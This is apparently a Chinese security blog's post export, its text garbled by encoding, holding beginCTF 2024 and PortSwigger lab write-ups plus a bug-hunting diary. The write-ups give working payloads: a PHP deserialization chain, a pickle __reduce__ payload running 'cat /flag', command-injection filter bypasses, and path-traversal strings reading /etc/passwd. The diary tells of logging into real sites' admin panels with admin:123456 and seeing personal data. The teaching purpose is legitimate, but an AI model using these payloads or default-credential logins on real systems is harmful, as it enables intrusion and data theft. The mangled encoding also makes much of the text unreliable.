POPé“¾æ„é€ ï¼šB::__destructåˆ°A::__getåˆ°Fun::__call åˆ«å¿˜äº†å°†ç©ºå­—ç¬¦æ”¹æˆ%00ï¼Œä¹‹åGETä¼ å‚ï¼š?begin=O:1:&quot;B&quot;:2:&#123;s:1:&quot;p&quot;;s:7:&quot;phpinfo&quot;;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;Fun&quot;:1:&#123;s:9:&quot;%00Fun%00func&quot;;s:20:&quot;call_user_func_array&quot;;&#125;&#125;&#125; PSï¼šåæ¥æ‰çŸ¥é“ï¼Œè¿™ä¸ªphpinfoæ˜¯ä¸ªéé¢„æœŸï¼ŒçœŸæ­£çš„è§£æ³•å®é™…ä¸Šæ˜¯æŠŠphpinfoæ”¹æˆenvç›´æ¥çœ‹ç¯å¢ƒå˜é‡ï¼ˆå…¶å®ä¹Ÿå·®ä¸å¤šï¼‰ pickelshopæ–°çŸ¥è¯†ç‚¹ï¼šè€ƒå¯Ÿpickelååºåˆ—åŒ– registeré¡µé¢æ³¨å†Œè·å–cookieï¼Œåœ¨loginé¡µé¢çš„httpå¤´ä¸­æ·»åŠ cookieä¼šå‘ç°å›æ˜¾ å› æ­¤åœ¨usernameä¸­æ·»åŠ __reduce__å‡½æ•°è¿›è¡Œå‘½ä»¤æ‰§è¡Œ 1234567891011121314151617181920import pickleimport base64class register(object): def __init__(self, username=&quot;test&quot;): self.username = username def __reduce__(self): return (eval, (&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;,))a = &#123;&#x27;username&#x27;: register(), &#x27;password&#x27;: &#x27;124&#x27;&#125;c = pickle.dumps(a, protocol=4)encoded_data = base64.b64encode(c)# å°†base64å­—ç¬¦ä¸²å†™å…¥Output.txtæ–‡ä»¶ä¸­print(a)print(encoded_data) ä¹‹åæ”¹Cookieå³å¯ readbooksæœ¬é¢˜è€ƒç‚¹ï¼šå‘½ä»¤æ‰§è¡Œ &#x2F;public&#x2F;book*å‘ç°åŒæ—¶åˆ—å‡ºæ¥äº†book1å’Œbook2çš„å†…å®¹ å› æ­¤ç›´æ¥&#x2F;list&#x2F;*è·å–å½“å‰ç›®å½•æ‰€æœ‰æ–‡ä»¶å å†ç”¨&#x2F;public&#x2F;black*è·å–é»‘åå•ï¼Œ&#x2F;public&#x2F;app*è·å–æºç  æºç å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677import osfrom flask import Flask, request, render_templateapp = Flask(__name__)DISALLOWED1 = [&#x27;?&#x27;, &#x27;../&#x27;, &#x27;/&#x27;, &#x27;;&#x27;, &#x27;!&#x27;, &#x27;@&#x27;, &#x27;#&#x27;, &#x27;^&#x27;, &#x27;&amp;&#x27;, &#x27;(&#x27;, &#x27;)&#x27;, &#x27;=&#x27;, &#x27;+&#x27;]DISALLOWED_FILES = [&#x27;app.py&#x27;, &#x27;templates&#x27;, &#x27;etc&#x27;, &#x27;flag&#x27;, &#x27;blacklist&#x27;]BLACKLIST = [x[:-1] for x in open(&quot;./blacklist.txt&quot;).readlines()][:-1]BLACKLIST.append(&quot;/&quot;)BLACKLIST.append(&quot;\\\\&quot;)BLACKLIST.append(&quot; &quot;)BLACKLIST.append(&quot;\\t&quot;)BLACKLIST.append(&quot;\\n&quot;)BLACKLIST.append(&quot;tc&quot;)ALLOW = [ &quot;&#123;&quot;, &quot;&#125;&quot;, &quot;[&quot;, &quot;pwd&quot;, &quot;-&quot;, &quot;_&quot;]for a in ALLOW: try: BLACKLIST.remove(a) except ValueError: pass@app.route(&#x27;/&#x27;)@app.route(&#x27;/index&#x27;)def hello_world(): return render_template(&#x27;index.html&#x27;)@app.route(&#x27;/public/&lt;path:name&gt;&#x27;)def readbook(name): name = str(name) for i in DISALLOWED1: if i in name: return &quot;banned!&quot; for j in DISALLOWED_FILES: if j in name: return &quot;banned!&quot; for k in BLACKLIST: if k in name: return &quot;banned!&quot; print(name) try: res = os.popen(&#x27;cat &#123;&#125;&#x27;.format(name)).read() return res except: return &quot;error&quot;@app.route(&#x27;/list/&lt;path:name&gt;&#x27;)def listbook(name): name = str(name) for i in DISALLOWED1: if i in name: return &quot;banned!&quot; for j in DISALLOWED_FILES: if j in name: return &quot;banned!&quot; for k in BLACKLIST: if k in name: return &quot;banned!&quot; print(name) cmd = &#x27;ls &#123;&#125;&#x27;.format(name) try: res = os.popen(cmd).read() return res except: return &quot;error&quot;if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;,port=8878) é»‘åå•è¿‡æ»¤äº†è®¸å¤šï¼Œå› æ­¤éœ€è¦ç»•è¿‡ ç©ºæ ¼ç”¨$IFS$9ä»£æ›¿ï¼Œå…³é”®å­—ä½¿ç”¨&#39;&#39;ç»•è¿‡ï¼Œæ‰§è¡Œçš„å‘½ä»¤è¿›è¡Œbase64è½¬æ¢ payload: &#x2F;public&#x2F;$IFS$9`ecâ€™â€™ho$IFS$9Lyo|baâ€™â€™se64$IFS$9-d` è¯»å–æ ¹ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶ Kingæœ¬é¢˜å‚è€ƒbeginCTF 2024 Webæ–¹å‘é¢˜è§£WP å…¨-CSDNåšå®¢","categories":[],"tags":[]},{"title":"è®°ä¸€æ¬¡ç®€å•çš„å…¬ç›ŠSRCæŒ–æ˜","slug":"è®°ä¸€æ¬¡ç®€å•çš„å…¬ç›ŠSRCæŒ–æ˜","date":"2024-02-05T12:51:02.491Z","updated":"2024-02-05T15:44:11.021Z","comments":true,"path":"2024/02/05/è®°ä¸€æ¬¡ç®€å•çš„å…¬ç›ŠSRCæŒ–æ˜/","link":"","permalink":"http://example.com/2024/02/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98/","excerpt":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;2&#x2F;5 åˆ†ç±»ï¼šdiary","text":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;2&#x2F;5 åˆ†ç±»ï¼šdiary å‰è¨€â€‹ å¼€å¤´åæ§½ä¸€ä¸‹ï¼Œæœ¬æ¥æƒ³æ‰¹é‡æŒ–thinkphpæ¡†æ¶æ¼æ´çš„ï¼Œä½†è¯•äº†ä¸€è¯•å‘ç°è¡Œä¸é€šï¼ˆæŒ–ä¸å‡ºæ¥ï¼‰ï¼Œç”šè‡³æˆ‘åœ¨æŸ¥èµ„äº§çš„æ—¶å€™æŸ¥åˆ°äº†é»„è‰²ç½‘ç«™ï¼ï¼ï¼äºæ˜¯åœ¨éƒé—·ä¹‹é™…éšä¾¿æï¼Œçœ‹è§ä¸€ä¸ªç½‘ç«™å°±æä¸€ä¸ªï¼Œå‡†å¤‡ç¢°ç¢°è¿æ°”ï¼Œç»“æœè¿˜çœŸè®©æˆ‘ç¢°åˆ°ä¸€ä¸ªå¼±å£ä»¤æ¼æ´ï¼Œä¸‹é¢è®²ä¸€è®²å…·ä½“è¿‡ç¨‹ã€‚ â€‹ è¿™äº‹è¿˜è¦ä»åŠä¸ªæœˆå‰è¯´èµ·â€¦ â€‹ Smggä¹‹å‰æ¥äº†ä¸ªæ´»ï¼Œè®©æˆ‘ä»¬å†™ä¸€ä¸‹ZoomEyeçš„å®æˆ˜å¿ƒå¾—ã€‚å®æˆ˜å¿ƒå¾—å˜›ï¼Œè‚¯å®šå¾—æŒ–å‡ºæ¥ç‚¹ä¸œè¥¿ã€‚ä½œä¸ºä¸€ä¸ªæ²¡æŒ–è¿‡æ´çš„runoobï¼Œåªèƒ½åˆ°æ—¶å€™ç°å­¦ç°å–äº†ï¼Œæœ¬æ¥æ‰“ç®—è¿‡ä¸¤å¤©å»å­¦çš„ã€‚ä½†æˆ‘å¿™ç€æ‰“BeginCTFå»äº†ï¼Œäºæ˜¯å°±å¿˜äº†ã€‚ â€‹ ç›´åˆ°æ˜¨å¤©ï¼ŒBeginCTFæ‰“çš„å·®ä¸å¤šäº†ï¼ŒWPä¹Ÿå†™å®Œäº†ï¼Œåˆšæƒ³èµ·è¿™ä¹ˆä¸ªäº‹ï¼Œäºæ˜¯ä¾¿èµ¶é¸­å­ä¸Šæ¶ï¼Œå­¦äº†ä¸€ä¸‹å¤§ä½¬ä»¬çš„ç›¸å…³æ€è·¯ï¼Œå¼€å§‹å®æˆ˜ï¼ï¼ï¼ æ˜¨æ—¥æ”¶è·â€‹ æ˜¨æ—¥ï¼Œæˆ‘å¤ç°äº†ä¸€ç¯‡å¤§ä½¬å†™çš„æŒ–æ˜ã€Šç”¨å‹U8-OAã€‹çš„SQLæ³¨å…¥æ¼æ´çš„å…·ä½“æµç¨‹æ¥ä½œä¸ºç»ƒä¹ ã€‚ï¼ˆç‰¹é™„ä¸Šå¤§ä½¬çš„æ–‡ç« ï¼šFofaæœç´¢è¯­æ³•æ‰¹é‡æŒ–æ˜sqlæ³¨å…¥æ¼æ´ - çŸ¥ä¹ (zhihu.com)ï¼‰ â€‹ æ—¢ç„¶å·²ç»ç¡®å®šäº†æƒ³è¦æŒ–æ˜çš„æ¼æ´ï¼Œé¦–å…ˆåˆ©ç”¨ZoomEyeè¿›è¡Œä¿¡æ¯æœé›†ã€‚ â€‹ ï¼ˆä¿é™©èµ·è§ï¼Œç»™å…³é”®ä¿¡æ¯æ‰“ç å¤„ç†ï¼‰ ä¹‹åç‚¹å‡»å³ä¾§çš„ä¸‹è½½å¯¼å‡ºæ‰€æœ‰çš„ä¿¡æ¯ã€‚ ä¸ºäº†è¿›è¡Œç®€å•çš„å¯¹æ¯”ï¼Œæˆ‘è¿˜åœ¨Fofaä¸Šæœé›†äº†ç›¸åŒçš„ä¿¡æ¯å¹¶å¯¼å‡ºã€‚ ä¹‹åä¾¿æ˜¯æ‰¹é‡å¤„ç†ï¼Œå†™ä¸ªè„šæœ¬å³å¯ï¼Œç›´æ¥æ‹¿å¤§ä½¬çš„è¿‡æ¥ç”¨ä¹Ÿè¡Œã€‚ æœ€ç»ˆæ”¶è·äº†8ä¸ªæœ‰æ¼æ´çš„ç½‘ç«™ï¼Œä½†æœ‰å‡ ä¸ªèƒ½äº¤ä¸Šå®Œå…¨æ˜¯æœªçŸ¥æ•°ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ 12345PS:åŒæ—¶ï¼Œä½œä¸ºæ˜¨æ—¥ä½¿ç”¨ZoomEyeçš„å¿ƒå¾—ï¼Œåœ¨æ­¤æ€»ç»“ä¸€ä¸‹ï¼š1.ZoomEyeç¡®å®æŒºå¥½ç”¨çš„ï¼Œå’ŒFofaæ¯”èµ·æ¥ä¹Ÿç®—æ˜¯å„æœ‰åƒç§‹ï¼Œæœé›†ä¿¡æ¯çš„æ—¶å€™æœ€å¥½ä½¿ç”¨äºŒè€…éƒ½æœä¸€ä¸‹ï¼Œäº’ç›¸è¡¥è¶³2.ZoomEyeæœç´¢å­åŸŸåæ˜¯ä¸€æŠŠå¥½æ‰‹ ä»Šæ—¥æ”¶è·â€‹ ä»Šå¤©æœ¬æ¥æƒ³å’Œæ˜¨å¤©ç±»ä¼¼ï¼Œæ•´ä¸€ä¸ªthinkphpçš„æ‰¹é‡æŒ–æ˜æ¥ç»ƒç»ƒæ‰‹ï¼Œç»“æœå°±ç¢°ä¸Šäº†â€œå‰è¨€â€é‡Œå†™çš„é‚£äº›poshiï¼Œä½†æ€»ä¹‹ä¹Ÿæ˜¯æœ‰æ”¶è·çš„å˜›ã€‚ä¸‹é¢å…·ä½“è®²ä¸€ä¸‹æ€è·¯ã€‚ â€‹ è¿˜æ˜¯ä¸€å¦‚æ—¢å¾€çš„æœé›†ä¿¡æ¯ï¼š â€‹ æœ¬æ¥æ˜¯æ‰“ç®—æ‰¹é‡åˆ·çš„ï¼Œç„¶è€Œå°±åœ¨æ­¤æ—¶ï¼Œæˆ‘è„‘å›è·¯ä¸€æŠ½ï¼Œçªç„¶æƒ³ç€æ‰‹æ‰“ã€‚å¯æ‰“ç€æ‰“ç€å‘ç°èœçš„ä¸€ä¸ªä¹Ÿæ‰“ä¸é€šï¼Œäºæ˜¯ä¾¿ç‰ç‰åœ°æ‰“å¼±å£ä»¤ï¼Œåˆšè¯•äº†ç¬¬ä¸€ä¸ªï¼Œå°±æˆäº†ã€‚é‚£ä¹ˆå¥½è¿ï¼Ÿï¼Ÿï¼Ÿ â€‹ ç»“æœè¿›å»ä¸€çœ‹ï¼Œæ˜¯ä¸ªç©ºçš„ï¼Œå•¥ä¹Ÿæ²¡æœ‰ï¼Œé‚£å¼±å£ä»¤è‡ªç„¶ä¹Ÿå°±æ²¡ç”¨äº†ã€‚åé¢ä»”ç»†çœ‹äº†ä¸€ä¸‹ï¼Œæ„Ÿè§‰è¿™ä¸ªå¥½åƒä¸æ˜¯ä»€ä¹ˆä¼ä¸šçš„ï¼Œé¡¶å¤šæ˜¯ä¸ªäººæ‹¿æ¥ç©çš„ä¸ªIPã€‚ â€‹ ä¸è¿‡ä¹Ÿç®—æ˜¯ä¸ªå¼€é—¨çº¢ï¼Œä¹‹åæœ¬ç€è¯•ä¸€è¯•çš„å¿ƒæ€æ¥ç€å°è¯•äº†ä¸ƒå…«æ¬¡ã€‚æ¬¸å˜¿ï¼Œè¿˜çœŸæ¥äº†ã€‚ â€‹ ç›´æ¥admin:123456ç™»è¿›å»ï¼Œå‘ç°è¿˜çœŸæ˜¯ç®¡ç†å‘˜æƒé™ï¼Œé‡Œè¾¹è¿˜æœ‰æ•æ„Ÿä¿¡æ¯ã€‚ ç®—ä¸ªä¸­é«˜å±ï¼Œäº¤äº†ï¼Œå˜¿å˜¿ã€‚ 1PS:ä»Šæ—¥ä»½æ€»ç»“ï¼šç‹—è¿å½“å¤´~~~ å’³å’³ï¼Œä»¥ä¸ºè¿™æ ·å°±ç»“æŸäº†ï¼Ÿæˆ‘æœ¬æ¥ä¹Ÿæ˜¯è¿™æ ·è®¤ä¸ºçš„ï¼Œå†™å®Œæ—¥è®°å‡†å¤‡æ”¶å·¥ï¼Œä½†å¥ˆä½•æ‰‹ç—’ï¼Œåˆæƒ³å¤šåˆ·å‡ ä¸‹ï¼Œäºæ˜¯åœ¨åˆ·äº†ä¸‰å››ä¸‹ä¹‹åè¿˜çœŸåˆç‹—è¿åˆ·åˆ°ä¸€ä¸ªå¼±å£ä»¤ï¼Œè¿™æ¬¡è¿˜æ˜¯ä¸ªeduçš„ï¼ŒèŠœæ¹–~~~ å†æ¬¡è´¦å·ï¼šadminï¼Œå¯†ç ï¼š123456æ‹¿ä¸‹ï¼Œä»ç„¶å…·æœ‰ç®¡ç†å‘˜æƒé™ã€‚ äº¤åˆ°edusrcï¼Œæ”¶å·¥ï¼ ç­‰ç­‰ï¼Œè¿™ä¹ˆå¥½æŒ–ï¼Œæ”¶ä»€ä¹ˆå·¥ï¼ï¼ï¼ï¼ç»§ç»­æŒ–ï¼ï¼ï¼ï¼ æ²¡5åˆ†é’Ÿï¼Œåˆæ¥ä¸€ä¸ªã€‚ æºæºä¸æ–­ï¼Œåˆåˆåˆæ¥ä¸€ä¸ªã€‚è¿™ä¸ªæ›´å‰å®³ï¼Œæ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼ŒåŒ…æ‹¬å§“åï¼Œæ‰‹æœºå·ï¼Œèº«ä»½è¯ç­‰ã€‚ â€‹ ä¹‹ååˆæŒ–åˆ°ä¸€ä¸ªå°çš„ï¼ŒæŒ‰é“ç†åº”è¯¥ç®—æ˜¯æŸä¸ªå›¢é˜Ÿæ­å»ºçš„è®ºå›ï¼Œç®—äº†ï¼Œç»Ÿç»Ÿäº¤ä¸Šã€‚ã€‚ã€‚ å·²ç»23ç‚¹åŠäº†ï¼Œä»Šå¤©é©¬ä¸Šç»“æŸäº†ï¼Œä»Šå¤©çš„æŒ–æ´ä¹ŸçœŸæ­£çš„åˆ°æ­¤ä¸ºæ­¢äº†ã€‚å¤ªçˆ½å•¦ï¼ï¼ï¼ 1PSï¼šä»Šæ—¥ä»½æ€»ç»“ï¼šé¸¿è¿é½å¤©ï¼ï¼ï¼","categories":[],"tags":[]},{"title":"Burpsuiteé¶åœº--Access_control(åå››é“)","slug":"Burpsuiteé¶åœº--Access_control(åå››é“)","date":"2024-01-10T08:19:59.663Z","updated":"2024-01-26T02:53:33.396Z","comments":true,"path":"2024/01/10/Burpsuiteé¶åœº--Access_control(åå››é“)/","link":"","permalink":"http://example.com/2024/01/10/Burpsuite%E9%9D%B6%E5%9C%BA--Access_control(%E5%90%8E%E5%9B%9B%E9%81%93)/","excerpt":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2023&#x2F;10&#x2F;18 åˆ†ç±»ï¼šwriteup","text":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2023&#x2F;10&#x2F;18 åˆ†ç±»ï¼šwriteup URL-based access control can be circumventedæ­¤ç½‘ç«™åœ¨&#x2F;adminå¤„æœ‰ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯çš„ç®¡ç†é¢æ¿ï¼Œä½†å‰ç«¯ä¸å¯è®¿é—®ï¼Œåç«¯æ”¯æŒX-Original-Urlï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç‚¹å‡»adminåæŠ“åŒ…ï¼Œå°†GETè®¿é—®çš„&#x2F;adminæ”¹æˆ&#x2F;ï¼Œæ·»åŠ X-Original-Url:/adminï¼Œå‘ç°æˆåŠŸã€‚ å†æ ¹æ®è¿”å›çš„å‰ç«¯æç¤ºä¿®æ”¹ä¸º/admin/deleteï¼Œå¹¶GETä¼ å‚?usernmae&#x3D;carlosï¼Œå³å¯æˆåŠŸã€‚ Method-based access control can be circumventedç™»å½•administratorï¼Œè¿›å…¥Admin panelï¼Œé€‰æ‹©carlosï¼Œç‚¹å‡»Upgrade userï¼Œå¹¶æŠ“åŒ…ï¼Œsend to Repeaterã€‚ å†ç™»å½•wienerï¼Œéšä¾¿ç‚¹å‡»ä»»æ„é¡µé¢ï¼ŒæŠ“åŒ…è·å–cookieã€‚ å°†æ›´æ”¹æƒé™æ•°æ®åŒ…ä¸­çš„cookieæ”¹æˆwienerçš„cookieã€‚ è¯·æ±‚æ–¹å¼æ”¹æˆPOSTXï¼Œè¿”å›ç¼ºå°‘å‚æ•°ï¼Œä¹‹åå†æ›´æ”¹è¯·æ±‚æ–¹æ³•ä¸ºGETï¼Œä¿®æ”¹usernameä¸ºwienerï¼Œå‘é€ï¼ˆæ­¤æ—¶ä¸€å®šè¦å¤„äºwienerç™»å½•çš„çŠ¶æ€ï¼‰ï¼Œå³å¯æˆåŠŸã€‚ Multi-step process with no access control on one stepç™»å½•administratorï¼Œè¿›å…¥Admin panelï¼Œé€‰æ‹©carlosï¼Œç‚¹å‡»Upgrade userï¼Œå¹¶æŠ“åŒ…ï¼Œsend to Repeaterã€‚ä¹‹åè¿˜æœ‰ä¸€ä¸ªé¡µé¢è¯¢é—®Are you sureï¼Ÿï¼Œç‚¹å‡»yesï¼ŒåŒæ—¶æŠ“åŒ…å‘é€åˆ°repeaterã€‚ ä¹‹åç™»å½•wienerï¼Œéšä¾¿æŠ“ä¸€ä¸ªåŒ…è·å–cookieï¼Œè¿›å…¥repeaterï¼Œå°†ä¸¤ä¸ªåŒ…ä¾æ¬¡ä¿®æ”¹ä¸ºwienerçš„cookieå’Œå§“åå¹¶å‘åŒ…ï¼Œå³å¯æˆåŠŸã€‚ Referer-based access controlç™»å½•administratorï¼Œè¿›å…¥Admin panelï¼Œé€‰æ‹©carlosï¼Œç‚¹å‡»Upgrade userï¼Œå¹¶æŠ“åŒ…ï¼Œsend to Repeaterã€‚ ä¹‹åç™»å½•wienerï¼Œéšä¾¿æŠ“ä¸€ä¸ªåŒ…è·å–cookieï¼Œè¿›å…¥repeaterï¼Œä¿®æ”¹ä¸ºwienerçš„cookieå’Œå§“åå¹¶å‘åŒ…ï¼Œå³å¯æˆåŠŸã€‚ åä¸¤é¢˜è€ƒç‚¹ï¼š â€‹ ï¼ˆå›¾æºï¼šhttp://t.csdnimg.cn/zrhTXï¼Œä¾µåˆ ï¼‰","categories":[],"tags":[]},{"title":"Burpsuiteé¶åœº--Path_Traversal","slug":"Burpsuiteé¶åœº--Path_Traversal","date":"2024-01-10T04:04:03.310Z","updated":"2024-01-26T02:56:30.426Z","comments":true,"path":"2024/01/10/Burpsuiteé¶åœº--Path_Traversal/","link":"","permalink":"http://example.com/2024/01/10/Burpsuite%E9%9D%B6%E5%9C%BA--Path_Traversal/","excerpt":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;1&#x2F;10 åˆ†ç±»ï¼šwriteup","text":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;1&#x2F;10 åˆ†ç±»ï¼šwriteup File path traversal, simple caseéšä¾¿æ‰“å¼€ä¸€ä¸ªåšå®¢ï¼ŒæŠ“åŒ…ï¼Œå°†?filename&#x3D;åçš„æ•°æ®æ”¹æˆ../../../../../etc/passwdå³å¯ã€‚ File path traversal, traversal sequences blocked with absolute path bypassåœ¨è¿™é“é¢˜ç›®ä¸­ï¼Œ..è¢«ç¦ç”¨ã€‚å› æ­¤æˆ‘ä»¬æ— æ³•ä½¿ç”¨ç›¸å¯¹è·¯å¾„../è§£é¢˜ï¼Œä»…èƒ½ä½¿ç”¨ç»å¯¹è·¯å¾„/è§£é¢˜ã€‚ ï¼ˆåœ¨Linuxç³»ç»Ÿä¸­ï¼Œæ–‡ä»¶è·¯å¾„æ˜¯éå¸¸é‡è¦çš„ã€‚&#x2F;etc&#x2F;passwdå’Œetc&#x2F;passwdçœ‹èµ·æ¥å¾ˆç›¸ä¼¼ï¼Œä½†å®é™…ä¸Šå®ƒä»¬æŒ‡å‘çš„æ˜¯å®Œå…¨ä¸åŒçš„ä½ç½®ã€‚ /etc/passwdï¼šè¿™æ˜¯ä¸€ä¸ªç»å¯¹è·¯å¾„ï¼Œå®ƒä»æ–‡ä»¶ç³»ç»Ÿçš„æ ¹ç›®å½•/å¼€å§‹ï¼ŒæŒ‡å‘etcç›®å½•ä¸‹çš„passwdæ–‡ä»¶ã€‚è¿™ä¸ªæ–‡ä»¶å­˜å‚¨äº†ç³»ç»Ÿä¸­æ‰€æœ‰ç”¨æˆ·çš„åŸºæœ¬ä¿¡æ¯ã€‚ etc/passwdï¼šè¿™æ˜¯ä¸€ä¸ªç›¸å¯¹è·¯å¾„ï¼Œå®ƒä»å½“å‰å·¥ä½œç›®å½•å¼€å§‹ï¼ŒæŒ‡å‘å½“å‰ç›®å½•ä¸‹çš„etcå­ç›®å½•ä¸­çš„passwdæ–‡ä»¶ã€‚å¦‚æœå½“å‰å·¥ä½œç›®å½•ä¸‹æ²¡æœ‰etcå­ç›®å½•æˆ–è€…etcå­ç›®å½•ä¸­æ²¡æœ‰passwdæ–‡ä»¶ï¼Œé‚£ä¹ˆè¿™ä¸ªè·¯å¾„å°±æ— æ³•æ­£ç¡®åœ°æ‰¾åˆ°æ–‡ä»¶ã€‚ï¼‰ å› æ­¤ï¼Œå°†?filename&#x3D;åçš„æ•°æ®æ”¹æˆ/etc/passwdå³å¯ã€‚ File path traversal, traversal sequences stripped non-recursivelyéé€’å½’åœ°å‰¥ç¦»éå†åºåˆ—æ—¶ï¼Œä½¿ç”¨....//æˆ–....\\/å°†å…¶æ¢å¤æˆæ­£å¸¸éå†åºåˆ—ã€‚ å°†?filename&#x3D;åçš„æ•°æ®æ”¹æˆ....//....//....//etc/passwdå³å¯ã€‚ File path traversal, traversal sequences stripped with superfluous URL-decodeæ ¹æ®é¢˜ç›®æè¿°ï¼Œæœ¬é¢˜éœ€è¦é€šè¿‡urlç¼–ç æ¥ç»•è¿‡è¿‡æ»¤ï¼Œå› æ­¤å¯¹..&#x2F;è¿›è¡Œä¸¤æ¬¡urlç¼–ç ã€‚ å°†?filename&#x3D;åçš„æ•°æ®æ”¹æˆ%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66etc/passwdå³å¯ã€‚ File path traversal, validation of start of pathæœ¬é¢˜çš„ç›®å½•éå†å¿…é¡»ä»¥é¢„æœŸçš„åŸºæ–‡ä»¶å¼€å¤´å³/var/www/images/ï¼Œå› æ­¤å°†?filename&#x3D;åçš„æ•°æ®æ”¹æˆ/var/www/images/../../../../etc/passwdå³å¯ã€‚ File path traversal, validation of file extension with null byte bypassæœ¬é¢˜çš„ç›®å½•éå†å¯¹æ–‡ä»¶ååç¼€çš„éªŒè¯ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨%00æˆªæ–­ã€‚ å°†?filename&#x3D;åçš„æ•°æ®æ”¹æˆ../../../../../etc/passwd%00.jpgå³å¯ã€‚","categories":[],"tags":[]},{"title":"Burpsuiteé¶åœº--Authentication","slug":"Burpsuiteé¶åœº--Authentication","date":"2023-12-03T14:37:29.364Z","updated":"2024-01-26T02:55:59.870Z","comments":true,"path":"2023/12/03/Burpsuiteé¶åœº--Authentication/","link":"","permalink":"http://example.com/2023/12/03/Burpsuite%E9%9D%B6%E5%9C%BA--Authentication/","excerpt":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2023&#x2F;10&#x2F;18 åˆ†ç±»ï¼šwriteup","text":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2023&#x2F;10&#x2F;18 åˆ†ç±»ï¼šwriteup Broken brute-force protection, IP blockæ‰“å¼€é¶åœºï¼Œè¿›å…¥loginç•Œé¢ï¼Œéšä¾¿è¾“å…¥è´¦å·å¯†ç ç„¶åburpæŠ“åŒ…ï¼Œä¹‹åå‘é€åˆ°Intruderæ¨¡å—ï¼Œæ¨¡å¼é€‰æ‹©Pitchforkã€‚ ç”±äºæ¯é”™æ¬¡ä¸ªå°±ä¼šå°ipï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨éœ€è¦çˆ†ç ´çš„ç”¨æˆ·åå’Œå¯†ç ä¸­äº¤æ›¿æ’å…¥æ­£ç¡®çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œå¹¶ä¿è¯ä¸€ä¸€å¯¹åº”ã€‚ åˆ©ç”¨notepad++çš„æ›¿æ¢åŠŸèƒ½ï¼Œåˆ¶ä½œå­—å…¸ã€‚ å¯†ç å­—å…¸åŒç†ã€‚ ä¹‹ååˆ†åˆ«åœ¨payload1å’Œpayload2å¯¼å…¥å­—å…¸ï¼Œè®¾ç½®çº¿ç¨‹æ•°ä¸º1ï¼Œå³å¯å¼€å§‹çˆ†ç ´ã€‚ è®¾ç½®ç­›é€‰carlos æ‰¾åˆ°é•¿åº¦å¼‚å¸¸çš„è¯·æ±‚ï¼Œä½¿ç”¨å…¶payload1å’Œpayload2ç™»å½•æˆåŠŸ Username enumeration via account lockæœ¬é¢˜é‡å¤ç™»å½•5æ¬¡å°±ä¼šé”å®šè´¦å·ï¼Œæ‰€ä»¥æŠŠæ‰€æœ‰è´¦å·è¿›è¡Œ5æ¬¡æšä¸¾ï¼Œä½¿ç”¨Intruderä¸­çš„Cluster bomb å‘ç°å¼‚å¸¸æ•°æ®ï¼ŒçŒœæµ‹authä¸ºç”¨æˆ·åï¼Œæ•…çˆ†ç ´å…¶å¯†ç ï¼ˆè™½ç„¶æœ‰é”å®šï¼Œä½†æˆ‘ä»¬å¯ä»¥è§‚å¯ŸæŠ¥é”™ä¿¡æ¯ï¼‰ï¼Œé€‰ç”¨Sniper å‘ç°123456789ä¸ºå¯†ç æ—¶æŠ¥é”™ä¿¡æ¯é•¿åº¦å¼‚å¸¸ï¼Œä½¿ç”¨auth:123456789ç™»å½•ï¼ŒæˆåŠŸ 2FA broken logicå…ˆç™»å½•wiener:peterï¼Œåœ¨burpçš„target-mapä¸‹æ‰¾åˆ°æ­¤ç½‘ç«™çš„login2 å°è¯•å°†verifyä¿®æ”¹ä¸ºæˆ‘ä»¬è¦æ”»å‡»çš„è´¦å·ï¼Œæ•…é€€å‡ºç™»å½•ï¼Œé‡æ–°ç™»å½•wiener:peterï¼Œåªæ˜¯è¿™æ¬¡æ‹¦æˆªlogin2ï¼Œå…ˆæ”¾è¿‡ç¬¬ä¸€ä¸ªåŒ…ï¼Œå†æ‹¦æˆªç¬¬äºŒä¸ªåŒ…å’Œç¬¬ä¸‰ä¸ªåŒ…å¹¶ä¿®æ”¹verifyä¸ºcarlosï¼Œå®Œæˆä¹‹åå‘ç°è¿˜è¦è¾“å…¥éªŒè¯ç ï¼Œæ ¹æ®ç™»å½•wiener:peterçš„ç»éªŒå¯çŸ¥éªŒè¯ç æ˜¯4ä½çº¯æ•°å­—ç»„åˆï¼Œå› æ­¤æˆ‘ä»¬ç›´æ¥çˆ†ç ´å³å¯ å¾—éªŒè¯ç ä¸º1657ï¼Œä¹‹åè¾“å…¥éªŒè¯ç åŒæ—¶æ‹¦æˆªåŒ…ï¼Œå°†verifyæ”¹ä¸ºcarlosï¼Œå³å¯æˆåŠŸ Brute-forcing a stay-logged-in cookieé¦–å…ˆæ ¹æ®ç°æœ‰å‡­æ®ç™»å½•ï¼Œå¹¶å‹¾é€‰stay logged in ç™»å½•ä¹‹åå‘ç°å­˜åœ¨stay-logged-in base64è§£å¯†å¾—:wiener:51dc30ddc473d43a6011e9ebba6ca770 åé¢çš„éƒ¨åˆ†ç”¨MD5è§£å¯†å¾—åˆ°peter äºæ˜¯æˆ‘ä»¬å…ˆé€€å‡ºç™»å½•ï¼Œä¹‹åå¯¹stay-logged-inè¿›è¡Œçˆ†ç ´ 